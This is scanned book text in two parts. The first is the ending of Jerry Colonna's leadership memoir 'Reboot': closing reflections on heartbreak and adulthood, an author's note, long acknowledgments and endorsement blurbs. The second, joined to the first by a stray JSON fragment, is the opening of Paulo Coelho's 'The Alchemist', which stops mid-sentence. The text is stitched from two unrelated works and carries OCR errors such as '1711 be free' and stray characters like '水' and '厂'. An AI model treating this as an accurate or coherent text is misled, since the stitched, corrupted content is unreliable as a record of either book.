married the love of his\nlife while two others divorced. The parents, grandparents, children, and\nspouses of various friends all struggled with illness and death.\n\nFor example, as I was finding my way to my words, my brother Vito was\ntemporarily silenced with painful throat cancer. When we were very young,\nVito had introduced me and my brothers, John and Dom, to Winnie-the-\nPooh. Dom, John, and I would climb over and around my big brother’s lap,\nlaughing as Vito read of Pooh knowing no other way to come down the\nstairs than upside down and with his head banging on each step (“silly old\nbear’’). We laughed with the love, safety, and belonging of our snuggling in\nour big brother’s lap. Now, decades later, as I write these words on a crisp\nSeptember morning, Vito has rediscovered his words; he e-mails the family,\n“The doctor says I’m cancer free.”\n\nIn March 2018, I flew to California. My plane landed, and my phone\nbuzzed with news I’d been dreading for close to a year: Dr. Sayres had died.\nAs the plane made its way over the tarmac to the gate, as the other\npassengers gathered their belongings, I sat still. I wept. Grief washed over\nme; she who is so present in this work, I thought, will never know the\ncompleted book.\nAround the same time, I was seated at a conference table at my doctor’s\noffice when the young internist came in to review the scan of my heart. “If\nit were me,” he said with his Adam’s apple bobbing, “I’d get a stent,\npreferably as soon as possible.” With that shock coursing through my body,\nI boarded a plane to spend the weekend in Providence, visiting my son\nMichael at school. The doctor’s words haunted me the whole of the flight:\n“If it were me, I’d get a stent.”\n\nThe next day, Michael and I strolled Thayer Street, stopping at the Brown\nUniversity bookstore. I was still clouded with shock, grief, and fear. At the\ncheckout counter, as I paid for a copy of Marie Ponsot’s latest collection of\npoetry and, for Michael, a copy of A Portrait of the Artist as a Young Man, 1\ncaught sight of a tiny button with black lettering on a white field: A LIGHT\nHEART LIVES LONG ... I stood next to one of my children—source of the\nfierce calling to be my most adult self—and wept once more. This time,\nthough, I wept at the wonderful synchronicity of life.\n\nIn the months since I opened myself to writing this book, an excavation\nof the relationship between leadership and the act of becoming an adult, my\nheart has been broken several times. With a cardiologist’s blessing, I chose\nnot to get the stent. My writing became my stent, keeping the arteries of my\nbroken heart open. My words, like my blood, flowed freely. A light heart\nthat lives long is one that has learned to appreciate the roller coaster from\nthe ground, to see that the point of it all is to know that life simply goes on.\nAnd, as my father once joked, the alternative to life not going on “isn’t that\ngreat.”\n\nThe synchronicity wasn’t manifested in my finding a button with a\nmessage I needed to hear at precisely the moment I needed to hear it. The\nsynchronicity lay in the testing of my core thesis precisely as I was writing\nthat thesis.\n\nIt was as if life itself were asking me if I truly believed my own simple\nassertion about life and leadership. What better way for the universe to test\nmy belief—that better humans make better leaders—than to send me on a\nroller-coaster ride of heartbreak, challenging me to be a better human? For\nthe patterns we developed to keep ourselves from feeling suffering and the\npain of broken hearts are what hold each of us back from being our most\nadult selves, the best leaders possible.\n\nI had to stand still and show up fully and keep showing up despite my\nbutt being kicked and my heart being broken.\n“[1]0 speak of such things without being willing to reveal your own\nactualization, your own journey to adulthood would be hollow and empty,”\nI wrote in the introduction, “Hollow and empty would not suffice.” That\nremained true, even as my butt was kicked and my heart ached.\n\nSharon Salzberg, my mogul of lovingkindness, bore witness to the butt\nkicking. As the great teacher that she is, Sharon helped me see that all\nthings were workable. Every bit of the experience—every joy and every\nvomit-inducing drop on the roller coaster—is an opportunity to practice and\nto grow. I honor her teachings when I remember that the art of growing up\nincludes the practice of remembering that all beings are basically good.\nSuch remembering, the late poet John O’ Donohue reminds us, is an\nessential element of adult leadership. “When someone fails or disappoints\nyou,” he writes, “May the graciousness with which you engage / Be their\nstairway to renewal and refinement.”\n\nAll things are workable. Every dip and rise of the roller coaster, every\ninstance of heartbreak and life unfolding, are opportunities for that radical\ninquiry within. In this way, we turn the experience of being a leader into the\njourney into adulthood. In this way, says O’ Donohue, leadership becomes,\n“a true adventure of growth.”\n\nThe goal of this book was to act on you as a coaching session might. The\ngoal was to give you something more useful than answers: the ability to\nwork with the questions, the uncertainties, and the doubts that spring from\nthe dips in life. To show you that you could arrive at your own answers;\nanswers that would be authentic and true to you. At some point you may\nfind doubts arising. At some point, if you’re at all like the rest of us, you\nmay ask yourself if you’re even able to participate in that true adventure of\ngrowth. If so, know that the answer is a resounding yes. But there’s a catch.\nIt’s yes, but only if you’re willing to put your head up to the mouth of the\ndemon. In this case, the demon is the underlying lack of belief in your\ncapacity to lead. The demon’s teeth are powerful questions, the answers to\nwhich frighten and startle you, accelerating your growth.\n\nThis path to adult leadership demands that such fearful questions are\nanswered fearlessly. To do this, we notice our responses, with discerning\ninquiry and without judgment, to the questions that arise. Inquiring this way\nisn’t, as some may fear, a form of indulgent navel gazing but a fearsome\nfirst step in the resolution to grow. Indeed, therein lies another opportunity\nfor leadership growth: What might my reluctance about looking inward say\nabout the protective patterns of my life? How might such a reticence be\nshaping my organization and our ability to consider alternative\npossibilities? What do the ghosts in my machine tell me about the risks\nposed by opening myself or standing firm while others open themselves?\nWhat do those ghosts need to hear to finally rest in peace?\n\nThere’s a tradition in Buddhism of dedicating the merit of any effort we\nundertake. In this way, we believe, all actions may be of service to others.\nIn honor of that tradition, may whatever merit my effort has generated be of\nservice to you. Moreover, may the merit generated by your seeking answers\nto powerful, open, and honest questions about your life and your leadership\nbe of service to those you lead. In the end, if I’ve managed to convince you\nthat better humans make better leaders, then your open, honest questions are\nsimple: “What is my work to do to become a better human?” “What kind of\nleader am I?” And, finally, “What kind of adult am I meant to be?”\nAuthor’s Note\n\nHere’s to the imperfection of memory. Here’s to the way we “fiction and\nfable our lives,” as the poet Padraig O Tuama, says, “in order to tell of\nthings that are more than true.” To complete this work, to show up in a way\nthat is not hollow and empty, I had to tap the wellspring of my imperfect\nand fabling memory.\n\nHow many stitches did I get at the top of my head after I slipped walking\ndown the steps into our house while wearing my roller skates? Was it six or\nsixteen times that the needle went into my skin at the top of my skull? Was\nthe bike I received at eight in celebration of my First Holy Communion red\nor purple?\n\nThe imperfection of remembering past things is often coupled with the\nneed to fiction and fable. I tried to meet this need and to do well by mixing\ncomposite and real, named characters. For to live well, notes my friend\nPadraig, “is to see wisely and to see wisely is to tell stories.”\n\nIndeed, some folks’ stories have been disguised while others have been\nleft out. In fact, there were far more folks absented than included. The many\npartners, co-founders, significant others, and family members have been left\nout not out of malice but simply by my best judgment. The times and places\nof events have been altered in ways to support the underlying message, to\nsupport the demand to say the more-than-true things.\n\nThe result is a collection of stories made visceral by my imperfect\nmemories and observations. I am, after all, Holder of Stories of the Heart,\nand we are a tribe of warriors sitting around a campfire, using tales to make\nsense of an insensible world.\nThere are those folks whose lives I touch upon who surely have different\nfeelings, observations, and perceptions. Such different views are no less\ntrue or valid than my own. While the facts remembered by others may be\ndifferent, our feelings are doubtlessly similar; maybe even more than true.\nThe wise elders in my life encouraged me to honor such different feelings,\nsuch different truths, as I honor my own.\n\nI’ve tried to use my truth to advance an understanding of the world as\nI’ve come to see it. What’s required of each of us, I believe, is to speak truth\nwhile releasing ourselves from the obligation to share the whole truth.\n\nThis said, and for what it’s worth, the bike was purple, and it had a great\nbanana seat.\nAcknowledgments\n\nMany authors acknowledge the people in their lives who helped make\ntheir book a reality. When I read that a book would not have been possible\nwere it not for the acknowledged folks, I’d always assumed such statements\nwere merely polite hyperbole. Then I wrote my own book. Now I know\nwhat those writers felt.\n\nFor example, this book benefitted from the support and patience of Ali\nSchultz.\n\nAli, you supported me through each word of every draft. You patiently\nlistened to me read aloud passage after passage, encouraging me as Id edit\non the fly. Far too many Sunday-evening dinners were spent with my\nfrustrated declarations of utter incompetence after a weekend of vain\nattempts to write. You stared me down and brooked no nonsense when I’d\nlament that I was never going to finish, that I was a fool for even trying, and\nthat I should just send back the advance. You pushed me forward when my\nCrow squawked his loudest. Indeed, you’ve always seen the good in me,\nespecially when my fears caused me to see only my failings.\n\nEven today you continue to tether me, keeping me grounded to the reality\nof who I am and the good work I do, and when I am lost and wishing for\nnothing more than to disappear into the crack of the tree, you show me the\nway home. Thank you for being my map and my anchor.\n\nDear Sam, Emma, and Michael: Of all the things I’ve done in my life,\nnothing compares to the experience of being your father. It is a gift that\ngrows in depth and meaning every day. I am breathless and in awe of the\nwonderful adults you’ve become, and will be forever grateful for the honor\nof being your parent.\n\nTo my brothers and sisters, thank you for allowing me to share my\nversion of our story. It is, of course, my version. But knowing that I had\nyour love and support made diving into the wreck of our shared past easier:\n\nVito, thank you not only for Christopher Robin and Edward Bear,\nbut for teaching all of us that words and music together can move\nus to be more than shattered souls. Thanks, too, for trying to teach\nDad to love jazz as much as you do. (“I don’t get this music,” he\nsaid. “It has no beginning, no middle, no end.” “Exactly,” said Vito,\nsmiling.)\n\nMary, way too early in a young girl’s life, you stepped into the role\nof caring for all of us, your siblings. Thank you. You listened to\neach of us and encouraged us to find our own voices. You gave me\nMadeline and The Story of Babar: The Little Elephant and opened\nme to the world of poetry. You saw in a scared, often wordless little\nboy his desire and love for words.\n\nNicki, my fierce, loving sister. Your steadfast resolve and\nunflinching regard for doing right by the world gifted me with a\ndeep appreciation for justice in the world. In doing so, you kept me\nsafe, helped me feel loved, and showed me time and again that I\nbelonged.\n\nAnnie, who early on told me to “write every day,” thank you for\nopening me up to Ani Pema Chédron and Parker Palmer. You gave\nme the gift of their words at precisely the moment when my heart\nwas broken open enough to allow those words to fall in. Thanks,\ntoo, for reading the very first short story I ever wrote, Chrysalis\nBroken, and for encouraging me to keep finding my words.\n\nDom, you never, ever stopped questioning the world and wondering\nwhy it can’t be more than what it is. In doing so, you taught me the\npower of wisdom and inquiry. More than that, though, you gave me\nlate nights eating fresh-popped popcorn, watching old movies on a\nblack-and-white TV, and staying up late to watch Yankee games.\nThank you for teaching me that it’s far wiser to be a Yankee fan\nthan a Mets fan.\n* John ...so many of my best memories include you: repairing\nschool lockers on hot summer days and extracting a broken drill bit\nfrom my thumb; visiting the Brooklyn Museum to try to sketch\nmosaic Roman ducks for our art class at Queens College; and\nbuilding the darkroom out of Grandpa Colonna’s wine cellar. Thank\nyou for always, always having my back.\n\nTo my grandparents and great-grandparents: Sangue del mio sangue.\nGrazie per i vostri sacrifici. Onoro tutto cio che avete rinunciato per poter\nparlare al posto vostro. And, to my father’s birth mother: Go raibh maith\nagat as saol m’athar.\n\nDear Sharon Salzberg, thank you for the kind words that open this work.\nMore, though, thank you for being my friend and my teacher. I will do my\nbest to honor your care by striving to help others every day and to live out\nthe meaning of lovingkindness.\n\nTo my fellow Reboot-ers: It’s difficult to describe the joy that comes\nfrom knowing that we’ve built a company that lives up to that which we\nteach our clients. To Khalid Halim and Dan Putt, thank you for trusting me\nwhen I said, “Hey, guys . . . I have an idea. . . .” To Andy Crissinger, Zane\nAltman, Chris VandenBrink, Courtney Joyce, and Albert Lee, thank you for\njoining this band of warriors in the revolution to bring love, soul, and magic\ninto companies. To Margaret Hendricks, who embodies the notion of\nsuperpowers.\n\nTo Jim Marsden, my once and future Pathfinder, thank you for your\nkindness, wisdom, and grace; Big Love to you, forever.\n\nI can’t mention Reboot without adding my deep and abiding thanks to all\nthe coaches with whom we have the great honor to work. Our work is\nsacred; thank you for your efforts to help leaders grow.\n\nOver the decades, I have had good friends who have taught me about the\nworld. From my childhood, there are Phil Levy, Danny Zogott, and Jeff\nOppenheim, with whom I began to explore the world beyond my family.\nYears later we discovered just how much we had in common. Later in my\nlife came Jeff Walker, Tracey Durning, Jenn McCrea, Carrie and Kirsten\nBarry, Ann Mehl (who first challenged me to come out of my post—investor\nyears exile), and Seth Godin, who’s taught me so much over the decades of\nour friendship, not the least of which is the liberation of a page left\nintentionally blank.\nThere’s also Tamdin Wangdu, who took me to Tibet, to touch the ground\nfrom which my soul was birthed. Linnea Passaler and Alessio Santo, who\ntook me to Palo del Colle to feel the ground that birthed my grandparents.\nThere’s Mark Pincus, who brought me to Fred Wilson, convincing me to\nconsider being his partner. There’s Kerri Rachlin; Kerri, for nearly twenty\nyears you’ve been my soul sister. Thank you for looking out for me,\nespecially when my depression would get the best of me (as it so often did).\nThere’s Ben Saunders, who, time and again, helps me understand the depths\nof bravery and the possibilities in dreaming.\n\nAnd of course, there are Fred Wilson and Brad Feld.\n\nFred taught me more than the business of venture capital; he taught me\nabout steadfastness, discernment, and leading with values, especially when\nthe judgment call was painful. Brad, my brother, you taught me the value of\na good walk and showed me the value of wisdom by having the incredible\ngood sense to have married Amy Batchelor. We need to sit again on your\nporch, my friend, and watch the sun set.\n\nThis book would not have come into being had it not been for the love\nand trust of the hundreds of people who asked me to hold their stories, as\nclients, as guests on my podcast, or as attendees at a workshop or boot\ncamp. These include: Tracy Lawrence, Al Doan, Kent Cavendar-Barres, Jeff\nOrlowski, Bryce Roberts, Bijan Sabet, Yancey Strickler, Amy Nelson,\nVirginia Bauman, Khe Hy, Natalie McGrath, Patty McCord, Semil Shah,\nTarikh Korula, Bobby Brannigan, Matt Tara, Ben Rubin, Dan Harris, Nancy\nLublin, Adi Mashiach, Sally Spencer-Thomas, Adeesh Agarwal, Derek\nFlanzraich, Erin Frey and Ti Zhao, Ian Hogarth, Jud Brewer, Nicole Glaros,\nMelissa Pasquale, Shelly Francis, Reverend Michelle Haunold Lorenz,\nLeonie Akhidenor, Simon Cant, Matt Munson, Cat Hoke, James Hollis,\nAlex Blumberg, Matt Lieber, Isaac Oates, Sarah Weiler, Amir Salihefendic,\nKonda Mason, Nicholas Russell, John Guydon, Dave Zwieback, Mary\nLemmer, Representative Tim Ryan, Patrick Campbell, Richard Hughes-\nJones, Henry May, Chris Marks, Evgeny Shadchnev, Zoe Weintraub,\nJoanne Domeniconi and Jules Pieri, Hugh MacLeod, Sherman Lee, Bill\nMorrison, Tanisha Robinson, Nigel Sharp, Dave Otten, Jeroen Wijering,\nBrian Rivkin, Vince Horn, Derek Bereit, Beth McKeon, Blaine Vess, Rand\nFishkin, Carm Huntress, Joe Chura, Joe Bassett, and Duncan Morris.\n\nMy gratitude to each of you; you honored me by asking me to hold your\nhearts for a bit.\nOthers who have helped along the way include Adam Grant, David\nCohen, Jason Calacanis (who, many years ago, helped Fred Wilson and me\nbe a little smarter about investing), Jeff Lawson, Jessi Hemphill (who told a\nfew folks the story of the man who makes founders cry), Kurt Andersen,\nMatt Stinchomb, Scott Kriens, and Tim Ferris. Thank you all.\n\nFor more years then I can recall, Wednesday mornings have been special,\nfor I joined a group of people to laugh, cry, and radically inquire within.\nTogether we’ve lived up to the assignment that Dr. Sayres gave us: to be\nadults. Thank you, Steve Padnick, Rory Rothman, Linda Peltz, Joan Hertz,\nand Phoebe Snochat for bearing witness to my finally growing up. I love\neach of you.\n\nWhatever wisdom I may share is merely a transmission of the teachings\nI’ve received. I’ve spoken before of Parker Palmer, but it’s important to\nnote here the profound importance of his work as a teacher. Parker, you\ncontinue to show so many the way to be adult in the world. Thank you.\n\nIn addition to Sharon Salzberg and Ani Pema, other teachers who have\nhelped me include Roshi Joan Halifax and Jerry Ruhl. Jerry Ruhl, a good\nand kind man whose works taught me profound insights long before we met\nin real life. Jerry, your books, Living Your Unlived Life and Contentment,\nwere turning points in my life. Thank you for writing them and thank you\nfor being you.\n\nI’m also deeply grateful for the works of David Whyte, Mary Oliver,\nJames Hollis, David Richo, and John Welwood, all talented thinkers and\nwriters. Writers and teachers such as these can be asteroids, forever\nchanging the trajectories of our lives.\n\nOther such asteroids include Jeff Levitsky, who, while I was still in high\nschool, introduced me to Nikos Kazantzakis, Fyodor Dostoyevsky, and\nRalph Ellison. “When I discover who I am,” wrote Ellison, “1711 be free.”\nThank you, Mr. Levitsky, for helping me to discover who I am and, with\nthat, become free.\n\nI’m grateful to Professor Robert Greenberg for awarding me a\nscholarship that kept me going at Queens College, and to Lilo Leeds, as\nwell as her husband, Gerry, for not only providing that scholarship but,\nlater, embodying openhearted leadership. Lilo was the best boss I’ve ever\nhad.\n\nIt should be recognized that creating a book is a collective act, and no\nwriter could have had a better collaborator than Hollis Heimbouch. Hollis,\nyou are a gift to writers everywhere. Jim Levine, my agent, was and\nremains a steadfast and kind soul, mirroring back exactly what my writer\nsoul needed to hear to keep going. Thanks, too, to the whole team at\nHarperCollins. I appreciate all you do to preserve the craft of publishing\nand to bring forth books that change lives.\n\nThe collaboration, though, of course went beyond editors and writers.\nKrista Tippett, Brad Feld, Steve Kane, and Chad Dickerson each worked\nthe lump of clay of the first drafts of the manuscript (the “shitty first draft”\nas Anne Lamott says) and helped me see what needed to be kneaded, what\nneeded to be added, and—most important—what needed to be cut. Your\nsuggestions made the shitty first draft better. Thank you.\n\nDoubtless, there are dozens more people I should have acknowledged.\nAny oversight stems purely from my own distractedness and not from\nmalice.\n\nFinally, there were folks in my life who specifically asked not to be\nincluded in this work. Your wishes deserve to be honored. Nevertheless, 1\ntake a moment to honor all that you have meant not only to me but to those\nwhom I love as well. I’ll remain grateful to you forever.\n\nLastly, the next time I pick up a book, I’m going to start by reading the\nacknowledgments. That will be my small way of recognizing how difficult\nit is to write one.\nAbout the Author\n\nJERRY COLONNA is the CEO and co-founder of Reboot.io, an executive\ncoaching and leadership development firm whose coaches and facilitators\nare committed to the notion that better humans make better leaders.

In his\nlife and work—and in this book—Jerry is a remarkable combination\nof fierce and gentle, gravitas and humor, laserlike intellect and\nplayful imagination. He knows that the unexamined life is not worth\nliving. He also knows that if you choose to live such a life, you\nshould never, ever take a job that involves other people. Jerry’s way\nof working with leaders has nothing to do with ‘seven steps to\nsuccess’ or posturing as an advocate for high-minded leadership\nvirtues. Instead, he helps us untangle the inner knots with which we\nhobble first ourselves, then our colleagues, then the work we do,\nthen the world. In these beautifully written pages—full of engaging\nstories, bedrock truths, and practical tools—you’ll learn about\nJerry’s way of working, about the man himself, and about yourself.\nLife offers no guarantees, but I can come close to assuring you that\nthis book will help heal you and transform the way you work to the\nbenefit of all concerned. I’m one among many who can testify that\nthat’s just what Jerry does.”\n\n—Parker J. Palmer, author of On the Brink of\nEverything, Let Your Life Speak, and The Courage to\nTeach\n\n“A few months into our nascent partnership, which we were calling\nAcme at the time but became Flatiron, Jerry and I got stuck in\nBoston due to bad weather. We decided to rent a car and drive home,\nfiguring we could get home and sleep in our own beds. As with\nmost late-night drives, the talk got real, and at one point, Jerry\nexplained that as a young adult he had tried to take his life. My\nunderstanding of Jerry changed completely at that moment, and so\ndid my appreciation for him. I’ve watched Jerry struggle, and\nultimately come to terms, with his demons. And in the process,\nmaybe because of it, he has become the most sought-after executive\ncoach. This book tells the story of that and a lot more. Jerry’s a role\nmodel for those who want to take the things that get in their way\nand turn them into the source of their strength. This book will help\nyou do the same.”\n\n—Fred Wilson, co-founder and partner of Union\nSquare Ventures\n\n“This book is filled with honesty, vulnerability, and insight, teaching\nus to be brave and to pursue radical self-inquiry to get to know\nourselves, to be truthful with ourselves, and to love ourselves. In\nthis pursuit, Jerry shines a light on a path that defines a healthier\nsense of what it means to be a leader. Countless books offer ways to\nbecome a better leader in the business world, but this is the only one\nwith the insight and wisdom to offer a unique perspective: To be a\nbetter leader, you must be a better human.”\n\n—Byyan Sabet, co-founder and general partner of\nSpark Capital\n\n“Reboot flips everything on its head, showing that it takes grit and\ntenacity to be vulnerable. With insightful and emotional stories,\nColonna shows how facing our pain head-on, with heart, can get us\nthrough to the other side. And how we can arrive there as more\nwhole and hopeful beings. And, boy, can the world use that now.\nThis book has inspired me to open up more, so that I can be more.”\n\n—Congressman Tim Ryan, U.S. House of\nRepresentatives, Ohio, and author of Healing\nAmerica\n“Reboot is filled with roller coasters, asteroids, and lemon drops;\n\nmy copy is now dog-eared, underlined, filled with notes, and a bit\nbanged up from all the times it was pulled in and out of my bag on\nflights. It is exactly what I had hoped it would be—the story of a\nbrokenhearted warrior. It’s Jerry’s story, and it encouraged me to\nreflect on my own. Seat taken, he models the behavior of an elder I\ncan see myself becoming. I thank him for being brave and\nopenhearted enough to write it; he stuck his head in the mouth of the\nmonster and showed all of us that we can do the same.”\n\n—Bryce Roberts, managing partner of OATV\n\n“Jerry Colonna’s Reboot takes us along on tough, inspiring journeys\nof self-discovery—his own, those of the people he’s helped, and\nyours, if you’re up to it. Startlingly candid stories from his business\nand personal life, along with insights from his study of the spiritual,\ncomplete his road map for aligning our values with our work.”\n\n—Anne Kreamer, author of 厂 8 Always Personal and\nRisk/Reward\n\n“Reboot is a tour de force—brilliant, brave, and deeply emotionally\nresonant. It will inspire those who sorely need help—but don’t seek\nit—to act. The description of the Loyal Soldier experience, for\nexample, is quite compelling, beautifully capturing how we\nmaintain painful and destructive parts of ourselves in order to\nsurvive. Reboot is powerful, penetrating, and psychologically\nmasterful. It’s a gift.”\n\n—Dr. Rory Rothman, Psya.D., LP\n\n“This is a book about courage and love. Jerry bravely stands in front\nof his reader with a strong back and open heart. Rather than merely\ndispensing advice or sharing anecdotes, he models the kind\nleadership to which we can all aspire.”\n\n—Isaac Oates, CEO of Justworks\n\n“Reboot is a book you can’t put down, with lessons you’ll want to\nrevisit time and time again. By sharing his deeply personal\nexperiences, Jerry uses his past as an instrument to help us find our\nown truths. He has given us the framework by which to carry\nforward uplifted and enlightened. I’m not only a better leader\nbecause of Jerry’s honesty, I’m a better person—friend, mother,\ncitizen.”\n\n—Sarah Kauss, founder and CEO of S’well\nSign up for Bookperk and get e-book\n\nbargains, sneak peeks, special offers, and\nmore—delivered straight to your inbox.\n\nSIGN UP NOW\n\nCopyright\n\nREBOOT.

            "text": "Paulo Coelho -\n\nThe Alchemist\n\nPhilip\nThe Alchemist\nPaulo Coelho\n\nTranslated by Alan R. Clarke.\nPublished 1992. ISBN 0-7225-3293-8.\nPART ONE\n\nThe boy's name was Santiago. Dusk\nwas falling as the boy arrived with his\nherd at an abandoned church. The roof\nhad fallen in long ago, and an\nenormous sycamore had grown on the\nspot where the sacristy had once stood.\n\nHe decided to spend the night there. He\nsaw to it that all the sheep entered\nthrough the ruined gate, and then laid\nsome planks across it to prevent the\nflock from wandering away during the\nnight. There were no wolves in the\nregion, but once an animal had strayed\nduring the night, and the boy had had to\nspend the entire next day searching for\nit.\n\nHe swept the floor with his jacket and\nlay down, using the book he had just\nfinished reading as a pillow. He told\nhimself that he would have to start\nreading thicker books: they lasted\nlonger, and made more comfortable\npillows.\n\nIt was still dark when he awoke, and,\nlooking up, he could see the stars\nthrough the half-destroyed roof.\n\nI wanted to sleep a little longer, he\nthought. He had had the same dream\nthat night as a week ago, and once\nagain he had awakened before it ended.\nHe arose and, taking up his crook,\nbegan to awaken the sheep that still\nslept. He had noticed that, as soon as he\nawoke, most of his animals also began\nto stir. It was as if some mysterious\nenergy bound his life to that of the\nsheep, with whom he had spent the past\ntwo years, leading them through the\ncountryside in search of food and\nwater. \"They are so used to me that\nthey know my schedule,\" he muttered.\nThinking about that for a moment, he\nrealized that it could be the other way\naround: that it was he who had become\naccustomed to their schedule.\n\nBut there were certain of them who\ntook a bit longer to awaken. The boy\nprodded them, one by one, with his\ncrook, calling each by name. He had\nalways believed that the sheep were\nable to understand what he said. So\nthere were times when he read them\nparts of his books that had made an\nimpression on him, or when he would\ntell them of the loneliness or the\nhappiness of a shepherd in the fields.\nSometimes he would comment to them\non the things he had seen in the\nvillages they passed.\n\nBut for the past few days he had spoken\nto them about only one thing: the girl,\nthe daughter of a merchant who lived\nin the village they would reach in about\nfour days. He had been to the village\nonly once, the year before. The\nmerchant was the proprietor of a dry\ngoods shop, and he always demanded\nthat the sheep be sheared in his\npresence, so that he would not be\ncheated. A friend had told the boy\nabout the shop, and he had taken his\nsheep there.\n\n水\n\n\"I need to sell some wool,\" the boy told\nthe merchant.\n\nThe shop was busy, and the man asked\nthe shepherd to wait until the\nafternoon. So the boy sat on the steps\nof the shop and took a book from his\nbag.\n\"I didn't know shepherds knew how to\nread,\" said a girl's voice behind him.\n\nThe girl was typical of the region of\nAndalusia, with flowing black hair, and\neyes that vaguely recalled the Moorish\nconquerors.\n\n\"Well, usually I learn more from my\nsheep than from books,\" he answered.\nDuring the two hours that they talked,\nshe told him she was the merchant's\ndaughter, and spoke of life in the\nvillage, where each day was like all the\nothers. The shepherd told her of the\nAndalusian countryside, and related the\nnews from the other towns where he\nhad stopped.\nIt was a pleasant change from talking\nto his sheep.\n\n\"How did you learn to read?\" the girl\nasked at one point.\n\n\"Like everybody learns,\" he said. \"In\nschool.\"\n\n\"Well, if you know how to read, why\nare you just a shepherd?\"\n\nThe boy mumbled an answer that\nallowed him to avoid responding to her\nquestion. He was sure the girl would\nnever understand. He went on telling\nstories about his travels, and her bright,\nMoorish eyes went wide with fear and\nsurprise. As the time passed, the boy\nfound himself wishing that the day\nwould never end, that her father would\nstay busy and keep him waiting for\nthree days. He recognized that he was\nfeeling something he had never\nexperienced before: the desire to live in\none place forever. With the girl with\nthe raven hair, his days would never be\nthe same again.\n\nBut finally the merchant appeared, and\nasked the boy to shear four sheep. He\npaid for the wool and asked the\nshepherd to come back the following\nyear.\n\n水\n\nAnd now it was only four days before\nhe would be back in that same village.\nHe was excited, and at the same time\nuneasy: maybe the girl had already\nforgotten him. Lots of shepherds\npassed through, selling their wool.\n\n\"It doesn't matter,\" he said to his sheep.\n\"I know other girls in other places.\"\n\nBut in his heart he knew that it did\nmatter. And he knew that shepherds,\nlike seamen and like traveling\nsalesmen, always found a town where\nthere was someone who could make\nthem forget the joys of carefree\nwandering.\n\nThe day was dawning, and the shepherd\nurged his sheep in the direction of the\nsun. They never have to make any\ndecisions, he thought. Maybe that's\nwhy they always stay close to me.\n\nThe only things that concerned the\nsheep were food and water. As long as\nthe boy knew how to find the best\npastures in Andalusia, they would be\nhis friends. Yes, their days were all the\nsame, with the seemingly endless hours\nbetween sunrise and dusk; and they had\nnever read a book in their young lives,\nand didn't understand when the boy\ntold them about the sights of the cities.\nThey were content with just food and\nwater, and, in exchange, they\ngenerously gave of their wool, their\ncompany, and—once in a while—\ntheir meat.\n\nIf I became a monster today, and\ndecided to kill them, one by one, they\nwould become aware only after most of\nthe flock had been slaughtered, thought\nthe boy. They trust me, and they've\nforgotten how to rely on their own\ninstincts, because I lead them to\nnourishment.\n\nThe boy was surprised at his thoughts.\nMaybe the church, with the sycamore\ngrowing from within, had been\nhaunted. It had caused him to have the\nsame dream for a second time, and it\nwas causing him to feel anger toward\nhis faithful companions. He drank a bit\nfrom the wine that remained from his\ndinner of the night before, and he\ngathered his jacket closer to his body.\nHe knew that a few hours from now,\nwith the sun at its zenith, the heat\nwould be so great that he would not be\nable to lead his flock across the fields.\nIt was the time of day when all of\nSpain slept during the summer. The\nheat lasted until nightfall, and all that\ntime he had to carry his jacket. But\nwhen he thought to complain about the\nburden of its weight, he remembered\nthat, because he had the jacket, he had\nwithstood the cold of the dawn.\n\nWe have to be prepared for change, he\nthought, and he was grateful for the\njacket's weight and warmth.\n\nThe jacket had a purpose, and so did\nthe boy. His purpose in life was to\ntravel, and, after two years of walking\nthe Andalusian terrain, he knew all the\ncities of the region. He was planning,\non this visit, to explain to the girl how\nit was that a simple shepherd knew how\nto read. That he had attended a\nseminary until he was sixteen. His\nparents had wanted him to become a\npriest, and thereby a source of pride for\na simple farm family. They worked\nhard just to have food and water, like\nthe sheep. He had studied Latin,\nSpanish, and theology. But ever since\nhe had been a child, he had wanted to\nknow the world, and this was much\nmore important to him than knowing\nGod and learning about man's sins.\n\nOne afternoon, on a visit to his family,\nhe had summoned up the courage to\ntell his father that he didn't want to\nbecome a priest. That he wanted to\ntravel.\n\n水\n\n“People from all over the world have\npassed through this village, son,\" said\nhis father.\n\n\"They come in search of new things,\nbut when they leave they are basically\nthe same people they were when they\narrived. They climb the mountain to\nsee the castle, and they wind up\nthinking that the past was better than\nwhat we have now. They have blond\nhair, or dark skin, but basically they're\nthe same as the people who live right\nhere.\"\n\n\"But I'd like to see the castles in the\ntowns where they live,\" the boy\nexplained.\n\n\"Those people, when they see our land,\nsay that they would like to live here\nforever,\" his father continued.\n\n\"Well, I'd like to see their land, and see\nhow they live,\" said his son.\n\"The people who come here have a lot\nof money to spend, so they can afford\nto travel,\"\n\nhis father said. \"Amongst us, the only\nones who travel are the shepherds.\"\n\n\"Well, then I'll be a shepherd!\"\n\nHis father said no more. The next day,\nhe gave his son a pouch that held three\nancient Spanish gold coins.\n\n\"I found these one day in the fields. I\nwanted them to be a part of your\ninheritance. But use them to buy your\nflock. Take to the fields, and someday\nyou'll learn that our countryside is the\nbest, and our women the most\nbeautiful.\"\n\nAnd he gave the boy his blessing. The\nboy could see in his father's gaze a\ndesire to be able, himself, to travel the\nworld—a desire that was still alive,\ndespite his father's having had to bury\nit, over dozens of years, under the\nburden of struggling for water to drink,\nfood to eat, and the same place to sleep\nevery night of his life.\n\n水\n\nThe horizon was tinged with red and\nsuddenly the sun appeared. The boy\nthought back to that conversation with\nhis father, and felt happy; he had\nalready seen many castles and met\nmany women (but none the equal of the\none who awaited him several days\nhence).\n\nHe owned a jacket, a book that he could\ntrade for another, and a flock of sheep.\nBut, most important, he was able every\nday to live out his dream. If he were to\ntire of the Andalusian fields, he could\nsell his sheep and go to sea. By the\ntime he had had enough of the sea, he\nwould already have known other cities,\nother women, and other chances to be\nhappy. I couldn't have found God in the\nseminary, he thought, as he looked at\nthe sunrise.\n\nWhenever he could, he sought out a\nnew road to travel. He had never been\nto that ruined church before, in spite of\nhaving traveled through those parts\nmany times. The world was huge and\ninexhaustible; he had only to allow his\nsheep to set the route for a while, and\nhe would discover other interesting\nthings. The problem is that they don't\neven realize that they're walking a new\nroad every day. They don't see that the\nfields are new and the seasons change.\nAll they think about is food and water.\n\nMaybe we're all that way, the boy\nmused. Even me—I haven't thought of\nother women since I met the\nmerchant's daughter. Looking at the\nsun, he calculated that he would reach\nTarifa before midday. There, he could\nexchange his book for a thicker one,\nfill his wine bottle, shave, and have a\nhaircut; he had to prepare himself for\nhis meeting with the girl, and he didn't\nwant to think about the possibility that\nsome other shepherd, with a larger\nflock of sheep, had arrived there before\nhim and asked for her hand.\n\nIt's the possibility of having a dream\ncome true that makes life interesting,\nhe thought, as he looked again at the\nposition of the sun, and hurried his\npace. He had suddenly remembered\nthat, in Tarifa, 